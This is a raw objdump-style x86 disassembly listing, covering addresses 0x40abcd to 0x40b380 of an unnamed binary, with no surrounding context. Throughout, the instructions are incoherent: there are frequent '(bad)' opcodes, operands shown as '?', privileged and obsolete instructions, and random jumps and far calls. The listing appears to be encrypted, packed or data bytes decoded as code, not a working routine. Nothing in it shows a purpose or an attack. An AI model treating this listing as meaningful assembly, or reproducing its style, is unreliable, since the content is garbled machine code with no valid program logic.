  40abcd:	or     DWORD PTR [ecx+0x477f7d34],ebp
  40abd3:	mov    ebx,0x5f63a86d
  40abd8:	add    eax,0x89f11f73
  40abdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abde:	xchg   esp,eax
  40abdf:	jecxz  0x40abfe
  40abe1:	ret    
  40abe2:	mov    edi,0x35c6a21c
  40abe7:	inc    eax
  40abe8:	icebp  
  40abe9:	push   ecx
  40abea:	mov    esi,0xb675614d
  40abef:	daa    
  40abf0:	aad    0xf7
  40abf2:	cli    
  40abf3:	sbb    eax,0x9a84ea4f
  40abf8:	xor    al,0x26
  40abfa:	push   esi
  40abfb:	(bad)  
  40abfc:	fcom   DWORD PTR [ecx-0x4e713075]
  40ac02:	das    
  40ac03:	div    DWORD PTR [edi-0x45d7f104]
  40ac09:	js     0x40ac19
  40ac0b:	ss pop edi
  40ac0d:	popf   
  40ac0e:	ja     0x40ac3f
  40ac10:	inc    ebx
  40ac11:	xor    ah,bl
  40ac13:	fwait
  40ac14:	cld    
  40ac15:	(bad)  
  40ac16:	popa   
  40ac17:	xor    ecx,DWORD PTR [edx+0x0]
  40ac1a:	aaa    
  40ac1b:	push   edx
  40ac1c:	mov    dh,cl
  40ac1e:	in     eax,dx
  40ac1f:	test   DWORD PTR [edi],0xf546e2fe
  40ac25:	mov    ecx,0xdb3a1545
  40ac2a:	iret   
  40ac2b:	pop    edx
  40ac2c:	(bad)  
  40ac2d:	jb     0x40ac72
  40ac2f:	scas   eax,DWORD PTR es:[edi]
  40ac30:	dec    edx
  40ac31:	mov    BYTE PTR [edx],dh
  40ac33:	fnstcw WORD PTR [edx]
  40ac35:	mov    DWORD PTR [edi-0x7b],eax
  40ac38:	dec    esi
  40ac39:	cwde   
  40ac3a:	ror    DWORD PTR [edi-0x42],1
  40ac3d:	scas   eax,DWORD PTR es:[edi]
  40ac3e:	or     bl,ah
  40ac40:	cwde   
  40ac41:	push   esp
  40ac42:	in     eax,dx
  40ac43:	sbb    ecx,DWORD PTR [ebx]
  40ac45:	ins    DWORD PTR es:[edi],dx
  40ac46:	cli    
  40ac47:	ret    
  40ac48:	and    eax,DWORD PTR [ecx-0x74]
  40ac4b:	mov    al,0x8a
  40ac4d:	add    eax,0x66a3dee0
  40ac52:	cld    
  40ac53:	cld    
  40ac54:	pop    eax
  40ac55:	je     0x40ac37
  40ac57:	int    0xf9
  40ac59:	cmp    edx,DWORD PTR [edx+0x6f]
  40ac5c:	das    
  40ac5d:	cwde   
  40ac5e:	mov    edx,0x43f6267e
  40ac63:	add    BYTE PTR [ecx-0x5c],0x72
  40ac67:	int3   
  40ac68:	int    0x41
  40ac6a:	mov    esi,0x75e07729
  40ac6f:	repz cs jle 0x40ac2d
  40ac73:	dec    eax
  40ac74:	mov    dh,ch
  40ac76:	repnz clc 
  40ac78:	sub    BYTE PTR [edx+edx*4-0x7ca310b2],0x36
  40ac80:	dec    ecx
  40ac81:	mov    ebx,ecx
  40ac83:	mov    cl,0x4c
  40ac85:	xor    BYTE PTR [esi+ecx*1-0x45],ch
  40ac89:	push   eax
  40ac8a:	or     eax,0xb8796d02
  40ac8f:	fpatan 
  40ac91:	mov    al,ds:0xa10c3e49
  40ac96:	sbb    esp,DWORD PTR [ebx+0x2910dcb7]
  40ac9c:	sub    eax,0x99ea93dc
  40aca1:	mov    gs,WORD PTR [ebx+0x4b]
  40aca4:	and    al,al
  40aca6:	push   edx
  40aca7:	fucom  st(6)
  40aca9:	add    BYTE PTR [edi-0x5c3abf8b],ah
  40acaf:	cmp    al,0x5e
  40acb1:	lods   al,BYTE PTR ds:[esi]
  40acb2:	xor    esi,DWORD PTR [edi-0x7db76b99]
  40acb8:	sbb    DWORD PTR [edx+esi*2+0xe091d04],0x2387ab1e
  40acc3:	xchg   ebp,eax
  40acc4:	(bad)  
  40acc5:	les    edx,FWORD PTR [ecx-0x7b0db17f]
  40accb:	loope  0x40ad46
  40accd:	fucomi st,st(4)
  40accf:	ds in  eax,0x60
  40acd2:	ins    DWORD PTR es:[edi],dx
  40acd3:	jg     0x40acda
  40acd5:	int3   
  40acd6:	pop    ss
  40acd7:	dec    esi
  40acd8:	fisttp QWORD PTR [edx]
  40acda:	mov    al,ds:0x380ba302
  40acdf:	push   esp
  40ace0:	(bad)  
  40ace2:	xchg   ch,dh
  40ace4:	sahf   
  40ace5:	mov    eax,ds:0x2096f030
  40acea:	mov    DWORD PTR ds:0xa962e855,ecx
  40acf0:	push   eax
  40acf1:	cli    
  40acf2:	sbb    eax,0xc856a9c3
  40acf7:	imul   esi,DWORD PTR [edx],0x39
  40acfa:	xchg   ebp,eax
  40acfb:	xor    esp,DWORD PTR [ecx]
  40acfd:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40acff:	imul   ecx,DWORD PTR [eax+0x59d9411a],0xc3d6574
  40ad09:	(bad)  
  40ad0a:	aam    0x86
  40ad0c:	jge    0x40acae
  40ad0e:	nop
  40ad0f:	lock jl 0x40acb7
  40ad12:	into   
  40ad13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad14:	dec    edx
  40ad15:	pop    ss
  40ad16:	neg    DWORD PTR [esi-0x1ae8530a]
  40ad1c:	sbb    al,0xec
  40ad1e:	xor    ah,al
  40ad20:	cld    
  40ad21:	icebp  
  40ad22:	mov    bl,BYTE PTR [edi]
  40ad24:	popa   
  40ad25:	fdivr  st,st(7)
  40ad27:	adc    cl,bh
  40ad29:	or     eax,ecx
  40ad2b:	gs call 0x2e21:0x18449e9e
  40ad33:	mov    bl,0xfa
  40ad35:	pusha  
  40ad36:	adc    eax,0xd0ba26d4
  40ad3b:	bound  ecx,QWORD PTR [ebp*2-0x1cddf78f]
  40ad42:	xor    cl,ah
  40ad44:	push   0x896e37cd
  40ad49:	sti    
  40ad4a:	dec    eax
  40ad4b:	mov    esp,0xfdb2b847
  40ad50:	sub    DWORD PTR [ebp-0x5cd73d80],esp
  40ad56:	cli    
  40ad57:	vmwrite ebx,DWORD PTR [esi+eiz*1+0x28]
  40ad5c:	es mov ah,0xe2
  40ad5f:	lds    ecx,FWORD PTR [ebx-0x40779164]
  40ad65:	cmp    edx,esi
  40ad67:	pop    ecx
  40ad68:	pop    edx
  40ad69:	add    esp,edx
  40ad6b:	jb     0x40ade6
  40ad6d:	pop    edi
  40ad6e:	pushf  
  40ad6f:	or     DWORD PTR ds:0x8e9baafe,esi
  40ad75:	in     eax,dx
  40ad76:	push   esp
  40ad77:	fld    DWORD PTR [edx+0x7ce007d5]
  40ad7d:	xor    DWORD PTR [edi],0xe8133da3
  40ad83:	cmp    ebx,DWORD PTR [ebp+0x1c]
  40ad86:	jbe    0x40ad7a
  40ad88:	pushf  
  40ad89:	inc    ecx
  40ad8a:	and    ch,BYTE PTR [ecx+0x7765bb00]
  40ad90:	pop    es
  40ad91:	fdivr  st,st(0)
  40ad93:	popa   
  40ad94:	mov    al,BYTE PTR [esi+0x4b]
  40ad97:	sti    
  40ad98:	test   esp,esi
  40ad9a:	fs xchg esi,eax
  40ad9c:	cs adc ah,bh
  40ad9f:	jo     0x40adf8
  40ada1:	dec    ecx
  40ada2:	sahf   
  40ada3:	leave  
  40ada4:	pop    edi
  40ada5:	cdq    
  40ada6:	mov    al,ds:0x17765f63
  40adab:	fcomp  DWORD PTR [ecx+ebp*4-0x4]
  40adaf:	xor    ah,bh
  40adb1:	cmp    al,0xc5
  40adb3:	jo     0x40add4
  40adb5:	push   ecx
  40adb6:	cmp    al,0x1
  40adb8:	mov    ds:0x5a25e41a,eax
  40adbd:	add    eax,0x652e4a4e
  40adc2:	xchg   DWORD PTR [edi],esp
  40adc4:	mov    DWORD PTR ds:0xc04d647c,edi
  40adca:	cmc    
  40adcb:	xchg   edx,eax
  40adcc:	lahf   
  40adcd:	shl    edx,0x20
  40add0:	sbb    DWORD PTR [edi-0x30],esi
  40add3:	xor    al,0x80
  40add5:	xlat   BYTE PTR ds:[ebx]
  40add6:	jns    0x40ae3d
  40add8:	je     0x40ad93
  40adda:	mov    cl,0x53
  40addc:	adc    BYTE PTR [ebx],0x33
  40addf:	out    dx,al
  40ade0:	sbb    eax,esi
  40ade2:	or     eax,0x20e0755b
  40ade7:	and    eax,0x8543e452
  40adec:	retf   
  40aded:	xlat   BYTE PTR ds:[ebx]
  40adee:	cmp    ah,BYTE PTR [ecx-0xaad6e]
  40adf4:	iret   
  40adf5:	sbb    BYTE PTR [esi+ebx*2+0x2fe7aa84],bh
  40adfc:	push   cs
  40adfd:	push   esp
  40adfe:	iret   
  40adff:	clc    
  40ae00:	paddd  mm7,QWORD PTR [ebx]
  40ae03:	iret   
  40ae04:	sbb    eax,0xca33bad7
  40ae09:	cs pusha 
  40ae0b:	imul   edi,DWORD PTR [ebx-0x78d227a4],0xeff14881
  40ae15:	out    0x4,eax
  40ae17:	sub    al,0x69
  40ae19:	jmp    0x40ae53
  40ae1b:	adc    al,0xd8
  40ae1d:	push   cs
  40ae1e:	mov    DWORD PTR [eax],ebx
  40ae20:	mov    ah,0xc8
  40ae22:	add    DWORD PTR [esp+ebx*2+0x8],ecx
  40ae26:	mov    BYTE PTR [ebp+edx*1+0x18],cl
  40ae2a:	jnp    0x40ae22
  40ae2c:	push   0xffffffa6
  40ae2e:	fmulp  st(1),st
  40ae30:	push   edi
  40ae31:	xchg   ecx,eax
  40ae32:	fstp   st(1)
  40ae34:	loopne 0x40ae5d
  40ae36:	xor    al,0x5f
  40ae38:	sbb    al,0x34
  40ae3a:	(bad)  
  40ae3b:	out    dx,eax
  40ae3c:	shr    dl,cl
  40ae3e:	mov    ?,esp
  40ae40:	push   ds
  40ae41:	leave  
  40ae42:	sbb    al,0x4
  40ae44:	fs jmp 0x40ae9a
  40ae47:	pop    esi
  40ae48:	jns    0x40ae81
  40ae4a:	fstp   DWORD PTR ds:0x4cd852cf
  40ae50:	call   0xccf7b9db
  40ae55:	ret    
  40ae56:	add    DWORD PTR ds:0x50e330d1,0xffffffc9
  40ae5d:	mov    ah,0xec
  40ae5f:	in     al,0xaa
  40ae61:	iret   
  40ae62:	std    
  40ae63:	mov    al,0xd6
  40ae65:	pop    esi
  40ae66:	fidivr DWORD PTR [edi-0x57]
  40ae69:	test   BYTE PTR [ebx-0x67],ah
  40ae6c:	sar    BYTE PTR [edx-0x61b9c838],cl
  40ae72:	cmc    
  40ae73:	jae    0x40ae5e
  40ae75:	xlat   BYTE PTR ds:[ebx]
  40ae76:	pop    edx
  40ae77:	pop    edi
  40ae78:	loopne 0x40ae5d
  40ae7a:	mov    edx,0xfc2b6e9b
  40ae7f:	stc    
  40ae80:	ja     0x40ae1d
  40ae82:	(bad)  
  40ae83:	pop    edx
  40ae84:	xchg   ecx,eax
  40ae85:	xor    al,0xac
  40ae87:	adc    dh,ch
  40ae89:	xchg   BYTE PTR [ecx-0x9],bh
  40ae8c:	cmc    
  40ae8d:	add    ch,BYTE PTR [edx]
  40ae8f:	pop    ebx
  40ae90:	pushf  
  40ae91:	mov    dh,0xb8
  40ae93:	sbb    DWORD PTR [ecx+0x3],0x73
  40ae97:	pop    esi
  40ae98:	aam    0x56
  40ae9a:	test   al,0x29
  40ae9c:	and    DWORD PTR [ecx],0xffffffee
  40ae9f:	cs jae 0x40aea1
  40aea2:	stos   BYTE PTR es:[edi],al
  40aea3:	pop    esp
  40aea4:	outs   dx,DWORD PTR ds:[esi]
  40aea5:	sbb    al,0x52
  40aea7:	push   es
  40aea8:	add    bl,BYTE PTR [ecx+0x4fa5f1ff]
  40aeae:	cwde   
  40aeaf:	push   ecx
  40aeb0:	lock int 0x53
  40aeb3:	push   cs
  40aeb4:	ds pop esi
  40aeb6:	cld    
  40aeb7:	sub    DWORD PTR [ebx+0x132cced],esp
  40aebd:	push   0x49
  40aebf:	push   ecx
  40aec0:	push   esi
  40aec1:	push   0xffffffa3
  40aec3:	(bad)  [eax]
  40aec5:	test   eax,0x28e5e3b
  40aeca:	jp     0x40aeeb
  40aecc:	js     0x40ae6a
  40aece:	push   es
  40aecf:	stc    
  40aed0:	imul   eax,ebp,0xd212c209
  40aed6:	pop    ds
  40aed7:	call   0x217b:0x350ca691
  40aede:	pop    edi
  40aedf:	ret    0xdfbf
  40aee2:	jb     0x40ae91
  40aee4:	xchg   ecx,eax
  40aee5:	sar    DWORD PTR [eax],0x25
  40aee8:	loop   0x40aef1
  40aeea:	sub    DWORD PTR [ebx],0xa9626376
  40aef0:	mov    esp,0x7b74988f
  40aef5:	sahf   
  40aef6:	imul   ebp,DWORD PTR [edx],0xfeeb6b59
  40aefc:	mov    esi,0xaea8e66c
  40af01:	xlat   BYTE PTR ds:[ebx]
  40af02:	jg     0x40af69
  40af04:	sahf   
  40af05:	xor    al,0x64
  40af07:	sub    ch,ch
  40af09:	mov    ch,0xe5
  40af0b:	mov    ebp,0x6f81838b
  40af10:	or     BYTE PTR [ecx-0x10],ah
  40af13:	push   0xbc894ee9
  40af18:	ror    ebx,1
  40af1a:	aaa    
  40af1b:	inc    esi
  40af1c:	scas   eax,DWORD PTR es:[edi]
  40af1d:	jne    0x40aeac
  40af1f:	and    ah,BYTE PTR [ecx-0x804d32e]
  40af25:	ins    BYTE PTR es:[edi],dx
  40af26:	les    ebp,FWORD PTR [ebx*8-0x2f8f9bd5]
  40af2d:	cmp    dl,BYTE PTR [esi+0x66]
  40af30:	repz mov edx,0x5ed9e087
  40af36:	fistp  DWORD PTR [ebx]
  40af38:	push   es
  40af39:	or     bh,BYTE PTR [edi]
  40af3b:	push   0x6eaa0d78
  40af40:	(bad)
  40af43:	xchg   esi,eax
  40af44:	ror    DWORD PTR [ecx+ebp*1-0x181e3b19],0xc7
  40af4c:	lods   al,BYTE PTR ds:[esi]
  40af4d:	dec    ebx
  40af4e:	fwait
  40af4f:	mul    esi
  40af51:	jo     0x40afcd
  40af53:	imul   esp,ebp,0xffffffbb
  40af56:	jecxz  0x40afb6
  40af58:	imul   ecx,DWORD PTR ds:0x5facdd13,0xb
  40af5f:	xchg   DWORD PTR [edx-0x46],edx
  40af62:	call   0x122e6a06
  40af67:	xchg   edi,eax
  40af68:	push   0x259f9215
  40af6d:	or     eax,DWORD PTR [edi]
  40af6f:	jecxz  0x40af33
  40af71:	mov    DWORD PTR [edx+0x3ceffdae],ecx
  40af77:	out    dx,al
  40af78:	ret    0xbfc6
  40af7b:	xor    eax,0xb6669489
  40af80:	xchg   BYTE PTR [edi-0x2918690e],ch
  40af86:	outs   dx,DWORD PTR ds:[esi]
  40af87:	jmp    0xde53cf4f
  40af8c:	mov    ebx,0xa4377caa
  40af91:	dec    eax
  40af92:	sub    BYTE PTR [eax+0x45acb17a],0x52
  40af99:	es stc 
  40af9b:	sahf   
  40af9c:	out    dx,al
  40af9d:	jl     0x40afb8
  40af9f:	bound  ebx,QWORD PTR ds:[esi+0x5a2755eb]
  40afa6:	cmp    al,0x41
  40afa8:	push   esi
  40afa9:	out    dx,al
  40afaa:	fild   QWORD PTR [ecx+0x5d]
  40afad:	jge    0x40b016
  40afaf:	jp     0x40af80
  40afb1:	mov    bl,0xd1
  40afb3:	(bad)  
  40afb4:	fisubr WORD PTR [ecx]
  40afb6:	mov    ebp,DWORD PTR [ecx+0x62d8d054]
  40afbc:	and    dh,BYTE PTR [ebp+0x37e8275c]
  40afc2:	push   cs
  40afc3:	mov    dh,0x5e
  40afc5:	push   0x2d
  40afc7:	push   ecx
  40afc8:	dec    ebx
  40afc9:	hlt    
  40afca:	push   0x4a
  40afcc:	jp     0x40b00b
  40afce:	cmp    edx,DWORD PTR [edi+0x2d]
  40afd1:	stos   BYTE PTR es:[edi],al
  40afd2:	and    dh,dl
  40afd4:	jo     0x40af70
  40afd6:	jp     0x40afc3
  40afd8:	ret    
  40afd9:	inc    ebx
  40afda:	out    0x1c,eax
  40afdc:	(bad)  
  40afdd:	fstp   TBYTE PTR [edx]
  40afdf:	sbb    dl,BYTE PTR [ebp+0x151d6afd]
  40afe5:	sbb    al,0xc4
  40afe7:	push   eax
  40afe8:	test   eax,0xbc86093a
  40afed:	mov    bh,0x0
  40afef:	mov    ecx,0xeffbdc29
  40aff4:	push   edi
  40aff5:	ds ret 
  40aff7:	iret   
  40aff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aff9:	(bad)  
  40affa:	push   ebx
  40affb:	fs adc al,0x61
  40affe:	pop    ebp
  40afff:	dec    eax
  40b000:	fs pop ds
  40b002:	adc    eax,DWORD PTR [eax]
  40b004:	dec    ecx
  40b005:	mov    ss,WORD PTR [ebx*4+0x7eb88285]
  40b00c:	sbb    edi,DWORD PTR [ecx+eiz*1-0x7729749]
  40b013:	pop    ebx
  40b014:	cld    
  40b015:	inc    ecx
  40b016:	mov    ecx,0xe814482b
  40b01b:	sub    DWORD PTR [eax-0x328aaf80],ebp
  40b021:	sub    ecx,0xffffffc4
  40b024:	sbb    DWORD PTR [edx+0x54287073],0xd4ac16c3
  40b02e:	inc    edi
  40b02f:	mov    bl,0x50
  40b031:	cwde   
  40b032:	mov    ebp,0xcac8d35a
  40b037:	mov    WORD PTR [edi],es
  40b039:	pop    ss
  40b03a:	or     BYTE PTR [edx+0x57],0x32
  40b03e:	jae    0x40b01f
  40b040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b041:	retf   0x4581
  40b044:	ror    DWORD PTR [esi+ebp*2+0x6f],0x70
  40b049:	mov    al,ds:0x8493b05d
  40b04e:	jle    0x40affe
  40b050:	sqrtps xmm7,XMMWORD PTR ds:0x19ef461b
  40b057:	cmc    
  40b058:	push   ecx
  40b059:	add    DWORD PTR [ebp+eiz*1-0x38],ecx
  40b05d:	push   esi
  40b05e:	ds or  eax,0x14385240
  40b064:	call   0x46e769de
  40b069:	inc    edi
  40b06a:	mov    eax,0xa99bfad0
  40b06f:	ret    0xf099
  40b072:	and    cl,bl
  40b074:	mov    al,ds:0xdcd4200c
  40b079:	bound  esp,QWORD PTR [esi-0x66485725]
  40b07f:	shl    BYTE PTR [ebx],1
  40b081:	adc    ecx,DWORD PTR [ebp+0x35]
  40b084:	mov    BYTE PTR [edx+0x6167035c],bh
  40b08a:	imul   esi,DWORD PTR [ebp+0x28e61241],0xffffffc8
  40b091:	je     0x40b0f4
  40b093:	cmp    ebx,esi
  40b095:	cdq    
  40b096:	mov    ah,0xc3
  40b098:	mov    dl,BYTE PTR [eax-0x17bbdc92]
  40b09e:	imul   edx,edi,0xffffff9f
  40b0a1:	(bad)  
  40b0a2:	push   ebp
  40b0a3:	pop    ebp
  40b0a4:	mov    ds,esi
  40b0a6:	sub    BYTE PTR [ecx+0x129571ac],0xe9
  40b0ad:	xchg   edi,eax
  40b0ae:	push   edx
  40b0af:	inc    esi
  40b0b0:	out    0x4,al
  40b0b2:	fs enter 0x14aa,0xe7
  40b0b7:	add    ecx,0x2c
  40b0ba:	(bad)  
  40b0bb:	(bad)  [ebx-0x6c]
  40b0be:	cmp    eax,0x1b3d47c3
  40b0c3:	call   0x872df385
  40b0c8:	aaa    
  40b0c9:	xchg   esp,eax
  40b0ca:	mov    cl,0x43
  40b0cc:	scas   al,BYTE PTR es:[edi]
  40b0cd:	call   0x6ccb:0x1296a1c3
  40b0d4:	adc    edx,DWORD PTR [edx-0x25]
  40b0d7:	ret    
  40b0d8:	jg     0x40b05b
  40b0da:	not    DWORD PTR [edx-0x579cc145]
  40b0e0:	loope  0x40b14b
  40b0e2:	pop    es
  40b0e3:	or     BYTE PTR [eax+0x3f],ah
  40b0e6:	or     DWORD PTR [ebx+0x610c2e5e],edx
  40b0ec:	fisubr WORD PTR [ebp-0x74]
  40b0ef:	mov    dl,0x7
  40b0f1:	dec    ebp
  40b0f2:	mov    cl,0xcb
  40b0f4:	les    ebp,FWORD PTR [ebp+0x78]
  40b0f7:	xor    DWORD PTR [edi],ecx
  40b0f9:	les    edi,FWORD PTR [edi+eiz*2+0x3c]
  40b0fd:	sar    BYTE PTR [edx+0x5466155c],cl
  40b103:	fmul   DWORD PTR fs:[ebx+0x7ed7f4cc]
  40b10a:	xlat   BYTE PTR ds:[ebx]
  40b10b:	std    
  40b10c:	ss (bad) 
  40b10e:	push   ebx
  40b10f:	or     edi,DWORD PTR [ebp-0x13]
  40b112:	daa    
  40b113:	scas   al,BYTE PTR es:[edi]
  40b114:	jbe    0x40b104
  40b116:	shr    BYTE PTR [eax],0x59
  40b119:	aas    
  40b11a:	mov    esp,0x2b410529
  40b11f:	or     ebp,DWORD PTR [edx-0x69d61432]
  40b125:	lahf   
  40b126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b127:	jmp    0xd8693ceb
  40b12c:	cmp    DWORD PTR [ebx+eiz*8-0x63],esi
  40b130:	test   DWORD PTR [ebp-0x83757a],ebp
  40b136:	adc    bl,BYTE PTR [esi+edx*8-0x28572e2b]
  40b13d:	aaa    
  40b13e:	or     al,0xc0
  40b140:	scas   al,BYTE PTR es:[edi]
  40b141:	cmp    BYTE PTR [edx],al
  40b143:	xchg   esi,eax
  40b144:	(bad)  
  40b146:	cmp    BYTE PTR [edi],bh
  40b148:	icebp  
  40b149:	mov    ebp,edi
  40b14b:	push   ebp
  40b14c:	pop    esp
  40b14d:	sub    bh,0x24
  40b150:	retw   0xad4a
  40b154:	pop    ebx
  40b155:	push   ss
  40b156:	or     BYTE PTR [eax+0x3c88e2ce],cl
  40b15c:	pop    ebp
  40b15d:	and    dh,ah
  40b15f:	pop    eax
  40b160:	inc    edx
  40b161:	lock test al,0xa6
  40b164:	cwde   
  40b165:	and    al,0xf
  40b167:	dec    esi
  40b168:	scas   eax,DWORD PTR es:[edi]
  40b169:	mov    BYTE PTR [edi+0x5c],0xa8
  40b16d:	pop    ebx
  40b16e:	adc    eax,0xa8f2a169
  40b173:	xchg   ecx,eax
  40b174:	hlt    
  40b175:	test   DWORD PTR ds:0x66386e02,esp
  40b17b:	pop    ss
  40b17c:	cld    
  40b17d:	adc    ebp,DWORD PTR [edx]
  40b17f:	repz jo 0x40b1e0
  40b182:	mov    al,0xb1
  40b184:	push   es
  40b185:	lahf   
  40b186:	iret   
  40b187:	dec    ebx
  40b188:	in     al,dx
  40b189:	pusha  
  40b18a:	pop    ds
  40b18b:	mov    ebp,0xfa72daa0
  40b190:	adc    cl,ch
  40b192:	mov    ah,0xbc
  40b194:	mov    ch,0xa
  40b196:	repnz cmp eax,0xba7469e
  40b19c:	stos   BYTE PTR es:[edi],al
  40b19d:	jge    0x40b1ca
  40b19f:	push   ebx
  40b1a0:	cwde   
  40b1a1:	ret    
  40b1a2:	push   esp
  40b1a3:	sbb    DWORD PTR [edx-0x3d75db62],eax
  40b1a9:	mov    dl,0x2d
  40b1ab:	iret   
  40b1ac:	ja     0x40b216
  40b1ae:	cs cli 
  40b1b0:	adc    eax,0x889b7d2e
  40b1b5:	jns    0x40b185
  40b1b7:	push   esp
  40b1b8:	aam    0x3d
  40b1ba:	ret    0x1cdc
  40b1bd:	dec    ebp
  40b1be:	sbb    al,dh
  40b1c0:	sbb    DWORD PTR [ebp+0x7fc5e8a2],edx
  40b1c6:	inc    esp
  40b1c7:	push   eax
  40b1c8:	(bad)  
  40b1c9:	mov    edx,0xbd06cf03
  40b1ce:	or     bl,BYTE PTR [esi+0x6c76103b]
  40b1d4:	mov    ebx,0x162b4888
  40b1d9:	xchg   ebx,eax
  40b1da:	or     edi,DWORD PTR cs:[eax]
  40b1dd:	mov    al,ch
  40b1df:	sbb    eax,0xac60767b
  40b1e4:	scas   al,BYTE PTR es:[edi]
  40b1e5:	adc    DWORD PTR [eax-0x27],ebp
  40b1e8:	icebp  
  40b1e9:	or     eax,0x213ebe5e
  40b1ee:	test   cl,cl
  40b1f0:	jno    0xea0e259a
  40b1f6:	fist   WORD PTR [esi-0x6f1c2249]
  40b1fc:	out    0x43,eax
  40b1fe:	mov    ch,0x5d
  40b200:	dec    esp
  40b201:	or     ecx,DWORD PTR [ebp+0x5e190036]
  40b207:	or     dl,BYTE PTR [eax-0x6b]
  40b20a:	arpl   WORD PTR [eax],bp
  40b20c:	fcmovu st,st(1)
  40b20e:	xchg   esi,eax
  40b20f:	js     0x40b26f
  40b211:	dec    edx
  40b212:	cwde   
  40b213:	lods   eax,DWORD PTR ds:[esi]
  40b214:	repnz test eax,0x7862e47e
  40b21a:	jmp    0xaf2f99ae
  40b21f:	lods   eax,DWORD PTR ds:[esi]
  40b220:	mov    DWORD PTR [ebx+0x52499fe2],edx
  40b226:	repz adc al,0x5f
  40b229:	ja     0x40b1e3
  40b22b:	jmp    0xce53580e
  40b230:	(bad)  
  40b231:	sbb    ecx,DWORD PTR cs:[esi]
  40b234:	imul   edi,DWORD PTR [edx+eax*2],0x662ef40a
  40b23b:	fsubr  DWORD PTR [edx+0x38d2ed58]
  40b241:	shl    DWORD PTR [esi+eax*2+0x12c9837c],1
  40b248:	lods   al,BYTE PTR ds:[esi]
  40b249:	cmp    eax,0xc4983f46
  40b24e:	and    ecx,DWORD PTR [esi]
  40b250:	lock pop edx
  40b252:	xor    eax,0x3c3a38d7
  40b257:	loope  0x40b214
  40b259:	clc    
  40b25a:	push   0x28
  40b25c:	inc    esi
  40b25d:	rcl    BYTE PTR [ebp+0x34],cl
  40b260:	jg     0x40b2aa
  40b262:	pop    edx
  40b263:	jbe    0x40b20d
  40b265:	call   0xbb12b738
  40b26a:	xchg   ebx,eax
  40b26b:	and    eax,0x29ec6af6
  40b270:	jp     0x40b2b2
  40b272:	push   ebp
  40b273:	inc    edx
  40b274:	inc    esi
  40b275:	aas    
  40b276:	aas    
  40b277:	add    BYTE PTR [esi+0x67],bl
  40b27a:	push   es
  40b27b:	add    eax,0x6b07d902
  40b280:	push   edi
  40b281:	stos   BYTE PTR es:[edi],al
  40b282:	xchg   esp,eax
  40b283:	daa    
  40b284:	push   ebx
  40b285:	jnp    0x40b268
  40b287:	js     0x40b2ef
  40b289:	sub    dh,0xd2
  40b28c:	paddq  mm6,QWORD PTR [eax-0x5a9a1bb9]
  40b293:	and    al,0x56
  40b295:	(bad)  
  40b297:	popf   
  40b298:	xchg   ebx,eax
  40b299:	xor    cl,bl
  40b29b:	jnp    0x40b2e8
  40b29d:	mov    edi,0xb006be48
  40b2a2:	inc    ecx
  40b2a3:	cmp    BYTE PTR [ebx-0x595575e9],bl
  40b2a9:	int    0xc4
  40b2ab:	dec    esi
  40b2ac:	scas   eax,DWORD PTR es:[edi]
  40b2ad:	cmc    
  40b2ae:	and    BYTE PTR [esi-0x23241a76],0xbc
  40b2b5:	ds sub ebx,ecx
  40b2b8:	jmp    0x40b2eb
  40b2ba:	dec    ebp
  40b2bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2bc:	adc    WORD PTR [ebx+0x66],di
  40b2c0:	stos   DWORD PTR es:[edi],eax
  40b2c1:	cld    
  40b2c2:	test   DWORD PTR [ebx],ebp
  40b2c4:	lock push ss
  40b2c6:	pop    ecx
  40b2c7:	fild   DWORD PTR ds:0xfd157d6e
  40b2cd:	xor    ah,al
  40b2cf:	fistp  DWORD PTR [ebp+ebp*2+0x3c]
  40b2d3:	and    edi,esi
  40b2d5:	popa   
  40b2d6:	mov    WORD PTR ds:0xe0c498d0,?
  40b2dc:	pop    ds
  40b2dd:	stos   BYTE PTR es:[edi],al
  40b2de:	or     bl,ch
  40b2e0:	popa   
  40b2e1:	mov    edx,0xa3c9cd9a
  40b2e6:	jle    0x40b2d7
  40b2e8:	add    esp,ebp
  40b2ea:	dec    ebx
  40b2eb:	pushf  
  40b2ec:	mov    ch,0xfa
  40b2ee:	je     0x40b2f2
  40b2f0:	pop    ecx
  40b2f1:	push   esi
  40b2f2:	fmul   QWORD PTR [ebx]
  40b2f4:	sub    eax,0x1b47ff23
  40b2f9:	add    al,0x38
  40b2fb:	cmp    ch,bh
  40b2fd:	lea    edx,[eax+0x69]
  40b300:	bound  eax,QWORD PTR [eax]
  40b302:	sbb    eax,0xf4b8cb22
  40b307:	jo     0x40b312
  40b309:	cli    
  40b30a:	xchg   edi,eax
  40b30b:	leave  
  40b30c:	rcr    dh,cl
  40b30e:	mov    esp,0xde615178
  40b313:	adc    esp,DWORD PTR [edi+0x2c5e2fe1]
  40b319:	fwait
  40b31a:	mov    dh,0xed
  40b31c:	xchg   ebx,eax
  40b31d:	in     eax,dx
  40b31e:	call   0x21fffa8f
  40b323:	stos   BYTE PTR es:[edi],al
  40b324:	sbb    BYTE PTR [ecx+0x6a3e557d],al
  40b32a:	push   ecx
  40b32b:	xchg   esi,eax
  40b32c:	xor    bh,0x92
  40b32f:	mov    BYTE PTR [eiz*1+0x7c87ef23],0xff
  40b337:	lods   eax,DWORD PTR ds:[esi]
  40b338:	out    0xc1,al
  40b33a:	sahf   
  40b33b:	xor    al,0x15
  40b33d:	shr    BYTE PTR [eax+ecx*4+0x74],1
  40b341:	(bad)  
  40b343:	cli    
  40b344:	mov    ebp,0xd7a6d187
  40b349:	loope  0x40b336
  40b34b:	mov    al,0x4
  40b34d:	es push esp
  40b34f:	mov    al,ds:0x2a8da5e2
  40b354:	ins    BYTE PTR es:[edi],dx
  40b355:	fstp   st(0)
  40b357:	xchg   edx,eax
  40b358:	add    esp,esp
  40b35a:	sbb    BYTE PTR [esp+eiz*2+0x6ddd6111],bl
  40b361:	xchg   BYTE PTR [ebx+edx*2],dl
  40b364:	and    al,0x7c
  40b366:	out    dx,eax
  40b367:	fbld   TBYTE PTR [eax+ecx*2-0x5573dff5]
  40b36e:	out    0x6e,eax
  40b370:	push   0xffffffb2
  40b372:	lea    ecx,[edi+0x71]
  40b375:	xor    DWORD PTR [esi],0x5e757e38
  40b37b:	cmp    eax,0x2570c08a
  40b380:	dec    ebp
